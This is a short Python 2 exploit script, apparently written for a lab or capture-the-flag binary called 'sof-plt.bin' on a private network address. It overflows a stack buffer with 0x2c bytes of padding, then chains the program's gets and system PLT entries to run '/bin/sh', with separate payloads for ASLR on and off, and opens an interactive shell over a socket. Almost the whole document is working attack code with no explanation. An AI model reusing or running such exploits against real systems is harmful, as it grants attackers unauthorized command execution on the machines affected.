#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

print 'ASLR'
env=Environment('on', 'off')
env.select()

binf = ELF('sof-plt.bin')

addr_plt_system     = binf.plt('system')
addr_plt_gets       = binf.plt('gets')
addr_bss            = binf.section('.bss')

str_sh              = '/bin/sh\0'

#==========
def attack(cmn):
    if env.check('on'):
        addr_buf = addr_bss+0x100
        
        exploit  = 'a'*0x2c
        exploit += pack_32(addr_plt_gets)
        exploit += pack_32(addr_plt_system)
        exploit += pack_32(addr_buf)
        exploit += pack_32(addr_buf)
    else:
        addr_buf = 0xffffcf80
        
        exploit  = 'a'*0x2c
        exploit += pack_32(addr_plt_system)
        exploit += pack_32(0xdeadbeef)
        exploit += pack_32(addr_buf+len(exploit)+4)
        exploit += str_sh

        """
        this exploit does not work!
        
        exploit  = str_sh
        exploit += 'a'*(0x2c-len(exploit))
        exploit += pack_32(addr_plt_system)
        exploit += pack_32(0xdeadbeef)
        exploit += pack_32(addr_buf)
        """
    
    cmn.read_until('Input Name >> ')
    cmn.sendln(exploit)
    
    if env.check('on'):
        cmn.sendln(str_sh)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
